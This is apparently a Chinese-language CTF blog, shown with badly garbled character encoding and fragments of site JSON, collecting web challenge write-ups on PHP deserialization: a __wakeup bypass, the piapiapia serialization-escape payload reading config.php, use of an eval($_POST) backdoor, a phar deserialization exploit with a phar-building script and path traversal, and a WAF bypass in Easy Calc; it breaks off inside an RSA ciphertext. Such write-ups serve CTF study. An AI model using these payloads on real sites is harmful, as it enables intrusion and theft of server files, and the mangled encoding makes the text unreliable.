å…³äºwakeup()å‡½æ•°ï¼šä¸sleep()å‡½æ•°ç›¸åï¼Œsleep()å‡½æ•°ï¼Œæ˜¯åœ¨åºåºåˆ—åŒ–æ—¶è¢«è‡ªåŠ¨è°ƒç”¨ã€‚__wakeup()å‡½æ•°ï¼Œåœ¨ååºåˆ—åŒ–æ—¶ï¼Œè¢«è‡ªåŠ¨è°ƒç”¨ã€‚ç»•è¿‡æ–¹æ³•ï¼šå½“ååºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºå±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®å±æ€§ä¸ªæ•°æ—¶ï¼Œä¼šè·³è¿‡ __wakeup å‡½æ•°çš„æ‰§è¡Œã€‚ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œéœ€è¦ç»•è¿‡wakeup()å‡½æ•°ï¼Œç„¶åä»¤username==adminï¼Œpassword==100æ‰èƒ½æ‰§è¡Œecho $flagï¼Œå› æ­¤éœ€è¦æ„é€ è¿™ä¸¤ä¸ªæ¡ä»¶ï¼Œä½†æ˜¯æˆ‘ä»¬å‘ç°ï¼Œè¿™ä¸¤ä¸ªå­—æ®µéƒ½æ˜¯privateå®šä¹‰çš„ï¼Œç»•è¿‡çš„æ—¶å€™éœ€è¦æ›´æ”¹åºåˆ—åŒ–ä¹‹åå±æ€§çš„æ ¼å¼ï¼š 1ã€privateå±æ€§åºåˆ—åŒ–çš„æ—¶å€™æ ¼å¼æ˜¯ %00ç±»å%00æˆå‘˜å 2ã€protectedå±æ€§åºåˆ—åŒ–çš„æ—¶å€™æ ¼å¼æ˜¯ %00*%00æˆå‘˜å å¯å‚è€ƒï¼šhttps://www.cnblogs.com/fish-pompom/p/11126473.htmlæ ¹æ®è¿™äº›ä¿¡æ¯æˆ‘ä»¬ä¾¿å¯ä»¥æ„é€ payloadã€‚ æ„é€ payloadé¦–å…ˆåœ¨class.phpä¸­åŠ å…¥ä¸‹åˆ—ä»£ç ï¼Œå¾—åˆ°ä¸€ä¸ªå®ä¾‹åŒ–å¯¹è±¡çš„ååºåˆ—åŒ–ï¼š $a = new Name('admin',100);$b=serialize($a);echo $b; æ‹¿åˆ°ååºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼š O:4:\"Name\":2:{s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";i:100;} ç„¶åæˆ‘ä»¬æŠŠå±æ€§å€¼2æ”¹æˆ3ä»¥ç»•è¿‡wakeup()æœ€åæ›´æ”¹ä¸¤ä¸ªå±æ€§åçš„æ ¼å¼å¦‚ä¸‹ï¼š O:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;} æœ€åï¼Œåœ¨index.phpä¸­æˆ‘ä»¬å‘ç°GETä¼ å‚selectï¼Œæ„é€ æœ€ç»ˆpayload ?select=O:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;} å³å¯æ‹¿åˆ°flagã€‚ [0CTF 2016]piapiapiaä¸€é“ååºåˆ—åŒ–é€ƒé€¸æ¼æ´åˆ©ç”¨é¢˜ç›®ã€‚ é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›®ä¹‹åæ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œå°è¯•ç™»å½•ç®¡ç†å‘˜ï¼Œå¤±è´¥ï¼Œä¹Ÿæ²¡æœ‰æ³¨å†ŒæŒ‰é’®â€¦é€šè¿‡æ‰«åå°å‘ç°å­˜åœ¨www.zipæ–‡ä»¶ï¼Œæœæ–­ä¸‹è½½äº†ï¼ŒæˆåŠŸæ‹¿åˆ°é¢˜ç›®æºç ã€‚å‹ç¼©åŒ…ä¸‹åŒ…å«`class.php`ã€`config.php`ã€`index.php`ã€`profile.php`ã€`register.php`ã€`update.php`å‡ ä¸ªæœ‰ç”¨çš„æ–‡ä»¶ã€‚è§£é¢˜å…³é”®åœ¨äºå¦‚ä¸‹éƒ¨ä½ï¼šé¦–å…ˆæ˜¯config.phpæ–‡ä»¶ï¼š &lt;?php $config['hostname'] = '127.0.0.1'; $config['username'] = 'root'; $config['password'] = ''; $config['database'] = ''; $flag = '';?&gt; ç”±æ­¤å¯çŸ¥ï¼Œflagå­˜åœ¨äºè¯¥æ–‡ä»¶ä¹‹ä¸‹ï¼Œéœ€è¦æƒ³åŠæ³•è¯»å–æ”¹æ–‡ä»¶å†…å®¹ã€‚åŒæ—¶ï¼Œåœ¨profile.phpæ–‡ä»¶ä¸‹æœ‰ä¸è¯»å–æ–‡ä»¶å†…å®¹ç›¸å…³çš„ä»£ç ï¼š &lt;?php require_once('class.php'); if($_SESSION['username'] == null) { die('Login First'); } $username = $_SESSION['username']; $profile=$user-&gt;show_profile($username); if($profile == null) { header('Location: update.php'); } else { $profile = unserialize($profile); $phone = $profile['phone']; $email = $profile['email']; $nickname = $profile['nickname']; $photo = base64_encode(file_get_contents($profile['photo']));?&gt; å¯çŸ¥ï¼Œæ§åˆ¶photoå˜é‡ä¸ºconfig.phpæˆ‘ä»¬ä¾¿å¯ä»¥è¯»å–åˆ°å…¶å†…å®¹ã€‚åŒæ—¶çœ‹åˆ°ï¼Œè¿™é‡Œå­˜åœ¨ä¸€ä¸ªååºåˆ—åŒ–çš„å‡½æ•°ï¼Œåˆæ­¥åˆ¤æ–­è§£é¢˜ä¸å®ƒç›¸å…³ã€‚åœ¨update.phpæ–‡ä»¶ä¸­æ‰¾åˆ°äº†å°†å­—ç¬¦ä¸²åºåˆ—åŒ–çš„åœ°æ–¹ï¼š &lt;?php require_once('class.php'); if($_SESSION['username'] == null) { die('Login First'); } if($_POST['phone'] &amp;&amp; $_POST['email'] &amp;&amp; $_POST['nickname'] &amp;&amp; $_FILES['photo']) { $username = $_SESSION['username']; if(!preg_match('/^\\d{11}$/', $_POST['phone'])) die('Invalid phone'); if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\\.[_a-zA-Z0-9]{1,10}$/', $_POST['email'])) die('Invalid email'); if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) &gt; 10) die('Invalid nickname'); $file = $_FILES['photo']; if($file['size'] &lt; 5 or $file['size'] &gt; 1000000) die('Photo size error'); move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name'])); $profile['phone'] = $_POST['phone']; $profile['email'] = $_POST['email']; $profile['nickname'] = $_POST['nickname']; $profile['photo'] = 'upload/' . md5($file['name']); $user-&gt;update_profile($username, serialize($profile)); echo 'Update Profile Success!&lt;a href=\"profile.php\"&gt;Your Profile&lt;/a&gt;'; } else {?&gt; å¯ä»¥çœ‹åˆ°ï¼Œæ­¤å¤„çš„ä»£ç æ˜¯å¯¹profileæ•°ç»„ä¸­çš„phoneã€emailã€nicknameã€photoè¿›è¡Œçš„åºåˆ—åŒ–ï¼Œåºåˆ—åŒ–ä¹‹åçš„æ•ˆæœå¦‚ä¸‹ï¼š a:4:{s:5:\"phone\";s:11:\"11111111111\";s:5:\"email\";s:11:\"123@qq.com\";s:8:\"nickname\";s:3:\"123\";s:5:\"photo\";s:39:\"upload/f3b94e88bd1bd325af6f62828c8785dd\";} è¿™é‡Œa:4æŒ‡çš„æ˜¯ç”±ä¸€ä¸ªæ•°ç»„åºåˆ—åŒ–è€Œæ¥ï¼Œå¹¶ä¸”æœ‰4ä¸ªå€¼ã€‚å¦‚æœæ˜¯å¯¹è±¡çš„è¯ï¼Œå°±æ˜¯æŠŠaæ”¹æˆOã€‚ç„¶åæ˜¯ä¸€ä¸ªé”®å€¼åï¼Œä¸€ä¸ªå˜é‡å€¼ï¼šs:5:&quot;phone&quot;:ç¬¬ä¸€ä¸ªé”®åï¼Œæ˜¯stringç±»å‹çš„ï¼Œé•¿åº¦ä¸ºäº”;s:11:&quot;11111111111&quot;:ç¬¬ä¸€ä¸ªå˜é‡å€¼ï¼Œstringç±»å‹ï¼Œé•¿åº¦ä¸º11ã€‚åé¢çš„ä¹Ÿæ˜¯è¿™ä¸ªè§„å¾‹ã€‚è¿™é‡Œå­˜åœ¨æˆ‘ä»¬è¦åˆ©ç”¨çš„ååºåˆ—åŒ–æ¼æ´ï¼šå¦‚æœæˆ‘ä»¬åœ¨è¿™ä¸ªåºåˆ—åŒ–å­—ç¬¦ä¸²çš„åé¢ï¼Œå†åŠ ä¸Šä¸€äº›å­—ç¬¦ï¼Œåé¢çš„å­—ç¬¦æ˜¯ä¸ä¼šè¢«ååºåˆ—åŒ–çš„ã€‚æœ€ååœ¨class.phpæ–‡ä»¶ä¸­è¿˜æœ‰ä¸¤ä¸ªéœ€è¦è¿‡æ»¤ï¼Œå¹¶ä¸”å¯¹æ‹¿flagæœ‰æ•ˆçš„æ­£åˆ™åŒ¹é…ï¼š public function filter($string) { $escape = array('\\'', '\\\\\\\\'); $escape = '/' . implode('|', $escape) . '/'; $string = preg_replace($escape, '_', $string); $safe = array('select', 'insert', 'update', 'delete', 'where'); $safe = '/' . implode('|', $safe) . '/i'; return preg_replace($safe, 'hacker', $string);} è¿™é‡Œä¼šå¯¹æˆ‘ä»¬è¾“å…¥çš„å†…å®¹è¿›è¡Œæ›¿æ¢ï¼Œæ¯”å¦‚å°†whereæ›¿æ¢ä¸ºhackerï¼Œè¿™å¯¹æˆ‘ä»¬çš„è§£é¢˜å¾ˆé‡è¦ã€‚ è‡³æ­¤ï¼Œè§£é¢˜æ€è·¯å·²ç»å¾ˆæ˜ç¡®äº†ï¼Œå°±æ˜¯æˆ‘ä»¬é€šè¿‡æ§åˆ¶è¾“å…¥ï¼Œå°†åºåˆ—åŒ–ä¹‹åçš„photoå¯¹åº”ä¸Šconfig.phpï¼Œé€šè¿‡æŠ“åŒ…å‘ç°nicknameæ˜¯å…¥æ‰‹ç‚¹ï¼Œä»å‰é¢å†™åˆ°çš„åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¹Ÿèƒ½çœ‹å‡ºæ¥ã€‚å› æ­¤åœ¨nicknameåé¢åŠ ä¸Š&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}å°±èƒ½å®ç°ï¼Œæœ€åæ•ˆæœå¦‚ä¸‹ï¼š a:4:{s:5:\"phone\";s:11:\"11111111111\";s:5:\"email\";s:11:\"123@qq.com\";s:8:\"nickname\";a:1:{i:0;s:3:\"123\";}s:5:\"photo\";s:10:\"config.php\";}s:39:\"upload/f3b94e88bd1bd325af6f62828c8785dd\";} è¿™é‡Œå°±å®ç°äº†photoä¸config.phpçš„å¯¹åº”ï¼Œè€Œæ‹¬å·åé¢çš„uploadç­‰ä¸ä¼šè¢«æ‰§è¡Œã€‚æ³¨æ„è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°nicknameæ˜¯ä¸€ä¸ªæ•°ç»„å‹çš„ï¼Œå› ä¸ºæˆ‘ä»¬å‰é¢æåˆ°è¿‡ï¼Œæœ‰å¯¹nicknameçš„æ­£åˆ™åŒ¹é…ï¼Œæ‰€æœ‰æˆ‘ä»¬éœ€è¦ç”¨æ•°ç»„æ¥ç»•è¿‡ã€‚ç°åœ¨çš„é—®é¢˜å°±æ˜¯&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}è¿™34å­—ç¬¦ï¼Œä½¿æˆ‘ä»¬åœ¨ä¼ å‚çš„æ—¶å€™è¦æ‰‹åŠ¨åŠ å…¥åˆ°nicknameæ•°ç»„ä¸­çš„ï¼Œè€Œæƒ³è¦æ‰“åˆ°æˆ‘ä»¬çš„ç›®çš„ï¼Œå°±å¿…é¡»æŠŠå®ƒä»¬ä»nicknameæ•°ç»„ä¸­æŒ¤å‡ºå»ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å‰é¢è¯´åˆ°çš„whereä¸hackerçš„æ›¿æ¢å°±æ´¾ä¸Šç”¨åœºäº†ï¼šæˆ‘ä»¬å¯ä»¥åœ¨ nicknameæ•°ç»„ä¸­å†™å…¥34ä¸ªwhereï¼Œé‚£ä¹ˆå°±æ›¿æ¢æˆäº†34ä¸ªhackerï¼Œä½†æ˜¯åºåˆ—åŒ–ä¹‹åçš„æ¯ä¸ªå˜é‡åå’Œå¸¸é‡å€¼éƒ½æ˜¯æœ‰å®šå€¼çš„ï¼Œæ¯”å¦‚ä¸Šé¢çš„s:5è¡¨ç¤ºé•¿åº¦æ˜¯5ï¼Œæ‰€ä»¥æ›¿æ¢ä¹‹åï¼Œ34ä¸ªwhereä¹‹åç´§è·Ÿçš„&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}å°±ä¸åœ¨å±äºnicknameæ•°ç»„äº†ï¼Œä¹Ÿå°±è¾¾åˆ°äº†æˆ‘ä»¬çš„ç›®çš„ï¼Œéƒ¨åˆ†payloadå¦‚ä¸‹ï¼š nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\";}s:5:\"photo\";s:10:\"config.php\";} è§£é¢˜æˆ‘ä»¬é¦–å…ˆå…ˆåˆ°register.phpä¸‹æ³¨å†Œä¸ªè´¦å·ï¼Œç™»å½•ä¹‹åæ›´æ–°ç”¨æˆ·çš„ä¿¡æ¯ï¼Œè¿™ä¸ªæ—¶å€™é€šè¿‡BPæŠ“åŒ…å†™å…¥payloadï¼Œç„¶åå°†nicknameæ”¹æˆnickname[]ï¼ŒåŒæ—¶å°†æˆ‘ä»¬æ„é€ å¥½çš„payloadå†™å…¥ï¼Œå¦‚å›¾ï¼šä»å“åº”åŒ…ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°ï¼Œpayloadå·²ç»æˆåŠŸæ‰“å…¥ï¼Œæ­¤æ—¶ï¼Œæˆ‘ä»¬ä¸Šä¼ çš„å›¾ç‰‡å­˜æ”¾çš„è·¯å¾„è¯»å–çš„ä¹Ÿå°±æ˜¯config.phpçš„å†…å®¹äº†ï¼Œæ­¤æ—¶å»profile.phpä¸‹æ‰“å¼€å›¾ç‰‡çš„é“¾æ¥å³å¯çœ‹åˆ°ä¸€ä¸²base64ï¼Œè§£ç å³å¯æ‹¿åˆ°flagã€‚ è¿™é“é¢˜ç›®å¯¹ååºåˆ—åŒ–æ¼æ´çš„è®¤è¯†åˆè¿›ä¸€æ­¥åŠ æ·±ï¼Œå­¦åˆ°äº†å­¦åˆ°äº†ã€‚ [æå®¢å¤§æŒ‘æˆ˜ 2019]Knifeè¿›å…¥é¢˜ç›®ï¼Œè§£é¢˜æ–¹æ³•å°±å¾ˆæ˜æ˜¾äº†ï¼Œæç¤ºäº†Knifeï¼Œå¹¶ä¸”ç»™äº†åé—¨è¯­å¥eval($_POST[&quot;Syc&quot;]);ï¼Œç”¨èšå‰‘è¿æ¥ä¸‹åˆ—é“¾æ¥ï¼š http://514be013-67a5-422b-ae7b-941c105e248b.node3.buuoj.cn/?Knife.php è¿æ¥å¯†ç å¾ˆæ˜æ˜¾ï¼šSycï¼Œè¿æ¥å³å¯æ‹¿flagã€‚ [CISCN2019 ååŒ—]Dropboxä¸€ä¸ªè€ƒå¯Ÿpharååºåˆ—åŒ–çš„é—®é¢˜ã€‚ç›¸å…³çŸ¥è¯†å‚è€ƒï¼šhttps://blog.ripstech.com/2018/new-php-exploitation-technique/https://paper.seebug.org/680/ é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›®ä¹‹åï¼Œé€šè¿‡æ³¨å†Œå¹¶ç™»å½•è´¦æˆ·ï¼Œå‘ç°å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œä¸Šä¼ æ–‡ä»¶ä¹‹åè¿›å…¥åˆ°ç®¡ç†é¢æ¿ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å‘ç°å¯ä»¥å¯¹æˆ‘ä»¬çš„æ–‡ä»¶è¿›è¡Œä¸‹è½½å’Œåˆ é™¤çš„æ“ä½œï¼šè¿™ä¸ªåœ°æ–¹å­˜åœ¨å¯ä»¥çš„åœ°æ–¹ï¼Œåœ¨ä¸‹è½½æ–‡ä»¶çš„æ—¶å€™ï¼ŒæŠ“åŒ…å‘ç°ï¼Œä¸‹è½½æ–‡ä»¶çš„è§„åˆ™å¾ˆç®€å•ï¼šé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æµ‹è¯•æ˜¯å¦å¯ä»¥ä¸‹è½½åˆ«çš„æ–‡ä»¶ï¼Œé€šè¿‡æ”¹åŒ…åˆ©ç”¨../../xxx.phpæµ‹è¯•å¯è¡Œæ€§ï¼Œç»“æœçœŸçš„èƒ½ä¸‹è½½æ–‡ä»¶ï¼šé€šè¿‡ä¸‹è½½index.phpæ–‡ä»¶ï¼Œæˆ‘ä»¬ä¾æ¬¡ä¸‹è½½åˆ°å…³é”®çš„class.phpå’Œdelete.phpæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼šclass.phpæ–‡ä»¶ï¼š &lt;?phperror_reporting(0);$dbaddr = \"127.0.0.1\";$dbuser = \"root\";$dbpass = \"root\";$dbname = \"dropbox\";$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);class User { public $db; public function __construct() { global $db; $this-&gt;db = $db; } public function user_exist($username) { $stmt = $this-&gt;db-&gt;prepare(\"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;\"); $stmt-&gt;bind_param(\"s\", $username); $stmt-&gt;execute(); $stmt-&gt;store_result(); $count = $stmt-&gt;num_rows; if ($count === 0) { return false; } return true; } public function add_user($username, $password) { if ($this-&gt;user_exist($username)) { return false; } $password = sha1($password . \"SiAchGHmFx\"); $stmt = $this-&gt;db-&gt;prepare(\"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);\"); $stmt-&gt;bind_param(\"ss\", $username, $password); $stmt-&gt;execute(); return true; } public function verify_user($username, $password) { if (!$this-&gt;user_exist($username)) { return false; } $password = sha1($password . \"SiAchGHmFx\"); $stmt = $this-&gt;db-&gt;prepare(\"SELECT `password` FROM `users` WHERE `username` = ?;\"); $stmt-&gt;bind_param(\"s\", $username); $stmt-&gt;execute(); $stmt-&gt;bind_result($expect); $stmt-&gt;fetch(); if (isset($expect) &amp;&amp; $expect === $password) { return true; } return false; } public function __destruct() { $this-&gt;db-&gt;close(); }}class FileList { private $files; private $results; private $funcs; public function __construct($path) { $this-&gt;files = array(); $this-&gt;results = array(); $this-&gt;funcs = array(); $filenames = scandir($path); $key = array_search(\".\", $filenames); unset($filenames[$key]); $key = array_search(\"..\", $filenames); unset($filenames[$key]); foreach ($filenames as $filename) { $file = new File(); $file-&gt;open($path . $filename); array_push($this-&gt;files, $file); $this-&gt;results[$file-&gt;name()] = array(); } } public function __call($func, $args) { array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) { $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); } } public function __destruct() { $table = '&lt;div id=\"container\" class=\"container\"&gt;&lt;div class=\"table-responsive\"&gt;&lt;table id=\"table\" class=\"table table-bordered table-hover sm-font\"&gt;'; $table .= '&lt;thead&gt;&lt;tr&gt;'; foreach ($this-&gt;funcs as $func) { $table .= '&lt;th scope=\"col\" class=\"text-center\"&gt;' . htmlentities($func) . '&lt;/th&gt;'; } $table .= '&lt;th scope=\"col\" class=\"text-center\"&gt;Opt&lt;/th&gt;'; $table .= '&lt;/thead&gt;&lt;tbody&gt;'; foreach ($this-&gt;results as $filename =&gt; $result) { $table .= '&lt;tr&gt;'; foreach ($result as $func =&gt; $value) { $table .= '&lt;td class=\"text-center\"&gt;' . htmlentities($value) . '&lt;/td&gt;'; } $table .= '&lt;td class=\"text-center\" filename=\"' . htmlentities($filename) . '\"&gt;&lt;a href=\"#\" class=\"download\"&gt;ä¸‹è½½&lt;/a&gt; / &lt;a href=\"#\" class=\"delete\"&gt;åˆ é™¤&lt;/a&gt;&lt;/td&gt;'; $table .= '&lt;/tr&gt;'; } echo $table; }}class File { public $filename; public function open($filename) { $this-&gt;filename = $filename; if (file_exists($filename) &amp;&amp; !is_dir($filename)) { return true; } else { return false; } } public function name() { return basename($this-&gt;filename); } public function size() { $size = filesize($this-&gt;filename); $units = array(' B', ' KB', ' MB', ' GB', ' TB'); for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024; return round($size, 2).$units[$i]; } public function detele() { unlink($this-&gt;filename); } public function close() { return file_get_contents($this-&gt;filename); }}?&gt; æˆ‘ä»¬çœ‹åˆ°ï¼Œå…¶ä¸­æœ‰å¤šä¸ªç±»çš„å®šä¹‰ï¼Œå…¶ä¸­delete()å‡½æ•°ä¸­çš„unlink()å¼•èµ·æ³¨æ„ï¼Œå› ä¸ºè¿™ä¸ªå‡½æ•°åœ¨å¤„ç†pharæ–‡ä»¶æ—¶ä¼šå°†åºåˆ—åŒ–çš„å†…å®¹ååºåˆ—åŒ–ï¼Œè¿™ä¸€ç‚¹åœ¨å‰é¢æä¾›çš„ç¬¬äºŒä¸ªé“¾æ¥æœ‰è®²åˆ°ï¼Œè¿˜æåˆ°äº†å…¶ä»–çš„å‡½æ•°ï¼Œå¦‚ä¸‹:å†çœ‹delete.phpï¼š &lt;?phpsession_start();if (!isset($_SESSION['login'])) { header(\"Location: login.php\"); die();}if (!isset($_POST['filename'])) { die();}include \"class.php\";chdir($_SESSION['sandbox']);$file = new File();$filename = (string) $_POST['filename'];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) { $file-&gt;detele(); Header(\"Content-type: application/json\"); $response = array(\"success\" =&gt; true, \"error\" =&gt; \"\"); echo json_encode($response);} else { Header(\"Content-type: application/json\"); $response = array(\"success\" =&gt; false, \"error\" =&gt; \"File not exist\"); echo json_encode($response);}?&gt; å…¶ä¸­$file-&gt;delete()æ—¶ä¾¿æ‰§è¡Œäº†unlink()å‡½æ•°ã€‚ é‚£ä¹ˆæˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªpharæ–‡ä»¶ï¼Œå†å»åˆ é™¤å®ƒï¼Œæ­¤å¤„ä¾¿å¯ä»¥æ§åˆ¶é€šè¿‡phar://æ‰§è¡Œäº†æˆ‘ä»¬ä¸Šä¼ çš„pharæ–‡ä»¶ï¼Œä¾¿å°†æ–‡ä»¶ä¸­åºåˆ—åŒ–çš„å†…å®¹ååºåˆ—åŒ–äº†ï¼Œåˆ©ç”¨è¿™ä¸ªéƒ¨åˆ†ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥æ„é€ pharæ–‡ä»¶ï¼Œæ¥è¯»å–flagæ–‡ä»¶äº†ã€‚ æ„é€ pharæ–‡ä»¶ç½‘ä¸Šæ‰¾åˆ°äº†æ„é€ pharæ–‡ä»¶çš„è„šæœ¬ï¼š &lt;?phpclass User { public $db;}class File { public $filename;}class FileList { private $files; public function __construct() { $file = new File(); $file-&gt;filename = \"/flag.txt\"; $this-&gt;files = array($file); }}$a = new User();$a-&gt;db = new FileList();$phar = new Phar(\"phar.phar\"); //åç¼€åå¿…é¡»ä¸ºphar$phar-&gt;startBuffering();$phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //è®¾ç½®stub$o = new User();$o-&gt;db = new FileList();$phar-&gt;setMetadata($a); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest$phar-&gt;addFromString(\"exp.txt\", \"test\"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶//ç­¾åè‡ªåŠ¨è®¡ç®—$phar-&gt;stopBuffering();?&gt; è§£é¢˜é¦–å…ˆä¸Šä¼ æ„é€ å¥½çš„pharæ–‡ä»¶ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„ï¼špharæ–‡ä»¶ä¸Šä¼ çš„æ—¶å€™å¿…é¡»ä¼ªè£…æˆimageæ–‡ä»¶ï¼Œé€šè¿‡BPæŠ“åŒ…ä¸Šä¼ ï¼šç„¶ååˆ é™¤æ–‡ä»¶ï¼Œæ­¤æ—¶æŠ“åŒ…ï¼Œç„¶åæŠŠè¦åˆ é™¤çš„æ–‡ä»¶åæ”¹ä¸ºphar://phar.png/exp.txtï¼Œç„¶åå³å¯æ‹¿åˆ°flagï¼š [RoarCTF 2019]Easy Calcç½‘ä¸Šæœ‰è¯´è¿™é“é¢˜è·ŸHTTPåè®®èµ°ç§æœ‰å…³è”ï¼Œä¹‹å‰çœ‹è¿‡httpèµ°ç§çš„æ–‡ç« ï¼Œä½†æˆ‘è§‰å¾—çš„æ›´å¤šçš„è€ƒå¯Ÿçš„å°±æ˜¯å‚æ•°è¿‡æ»¤çš„ç»•è¿‡è¿˜æœ‰å¯¹è¾“å…¥å­—ç¬¦åšé™åˆ¶æ—¶å€™çš„ç»•è¿‡ã€‚ä¸è¿‡è¿™é‡Œå¯ä»¥å†å­¦ä¹ ä¸€ä¸‹httpèµ°ç§ï¼Œè¿˜å­¦åˆ°äº†ä¸€äº›åˆ©ç”¨PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§Bypassçš„æ–¹æ³•ã€‚ é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›®æŸ¥çœ‹æºç å‘ç°clac.php?numè¢«banäº†ï¼ŒåŒæ—¶åœ¨calc.phpä¸­å¯ä»¥æ‹¿åˆ°æºç ï¼š &lt;?phperror_reporting(0);if(!isset($_GET['num'])){ show_source(__FILE__);}else{ $str = $_GET['num']; $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]','\\$','\\\\','\\^']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $str)) { die(\"what are you want to do?\"); } } eval('echo '.$str.';');}?&gt; é¦–å…ˆå¯¹ä¼ å‚numè¿›è¡Œäº†è¿‡æ»¤ï¼Œä½†æ˜¯è¦æƒ³è¯»å‡ºflagï¼Œåˆå¿…é¡»ç”¨numä¼ å‚ï¼Œè¿™æ—¶å€™æƒ³åˆ°åˆ©ç”¨ç©ºæ ¼çš„ç»•è¿‡æ–¹æ³•ã€‚è¡¥å……ä¸€ç‚¹çŸ¥è¯†ï¼š phpçš„è§£æè§„åˆ™ï¼šå½“phpè¿›è¡Œè§£æçš„æ—¶å€™ï¼Œå¦‚æœå˜é‡å‰é¢æœ‰ç©ºæ ¼ï¼Œä¼šå»æ‰å‰é¢çš„ç©ºæ ¼å†è§£æï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹ç»•è¿‡wafã€‚ ä¹Ÿå°±æ˜¯è¯´åˆ©ç”¨numä¼ å‚å°±å¯ä»¥äº†ã€‚æˆ‘ä»¬è¿˜çœ‹åˆ°/ä¹Ÿè¢«banäº†ï¼Œå†æƒ³è¦æŸ¥çœ‹ç›®å½•ä¸‹çš„å†…å®¹ï¼Œå°±éœ€è¦å€ŸåŠ©ä¸€äº›ç³»ç»Ÿå‡½æ•°äº†ã€‚åˆ©ç”¨chr()å‡½æ•°å³å¯å€ŸåŠ©æ•°å­—æ¥æ„é€ è¢«bançš„å­—ç¬¦ï¼Œæ¥æœ€ç»ˆè¯»å–flagï¼Œæœ€ç»ˆpayloadå¦‚ä¸‹ï¼š /calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))","link":"/2020/02/07/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A0/"},{"title":"HackTM2020-WriteUp","text":"HackTM2020-WriteUpå‡æœŸè¢«â€œå…³ç¦é—­â€ï¼Œçœ‹åˆ°æˆ˜é˜Ÿå‘çš„æ¯”èµ›é“¾æ¥ï¼Œè™½ç„¶çŸ¥é“è‡ªå·±å¾ˆèœï¼Œé¢˜ç›®ä¸æ˜¯æˆ‘å¯ä»¥åšçš„ï¼Œä¸è¿‡è¿˜æ˜¯å¤§èƒ†å°è¯•äº†ï¼Œå‘ç°ä¸€äº›é¢˜ç›®è¿˜æ¯”è¾ƒç®€å•[æ»‘ç¨½è„¸]ï¼Œè¿™é‡Œå†™ä¸€ä¸‹éƒ¨åˆ†é¢˜ç›®çš„WPã€‚ RSA#1è¿™æ˜¯ä¸€ä¸ªç®€å•çš„RSAçˆ†ç ´é¢˜ã€‚ é¢˜ç›®åˆ†æé¢˜ç›®ç»™äº†ä¸¤ä¸ªé™„ä»¶ï¼šcã€rsa.pyï¼Œå…¶ä¸­cçš„å†…å®¹å¦‚ä¸‹ï¼š Public key:(65537, 28150970547901913019901824364390497053600856369839321617996700606130553862041378369018779003752433356889118526332329074054728613209407037089320809898343953157935211086135010436283805891893636870991411236307901650696221491790470635225076251966300189483160148297407974155121570252648252906976186499329924342873)Encrypted flag:[24603931406187071861602497345394097692989773194039735745762181586628499407802825983901643034231448504738113184470035863824128031443012073830520233613935485192804104698999763287388765215634314977991988580048221541560353418280294402691661980705832590960497587810514295642811714680627768268704899874164681718449, 11226318059664066669163529308725576208632153806776762372429671026861927737060205604020741904348343722215670471225630839065129589767356765848271000166982882271636977663052775953958080543340165408211633442938366994031562890034541604362383645601883118173819506187865617998294930587997187071040181458961091560176, 15645290594995180815865397749136800126080704684884296404807344870555186823350216705796063922278419585484662234210001661578549560411864952462380096494781766394542247609648743673312823946783517115542404474786395934886667795692210287283039316418126796934535150832709500306153601987121172178183970841498331059732, 24345863558959407738249127568820138362115734211146549194534219311913032290216606859385934708675962835857804566049600710875035366973110422262131331932310524891713319358676673958738776644229757625523955354996402750265022578843637525183704187498194489645838490640529841182709661371499013082259193633000753627261, 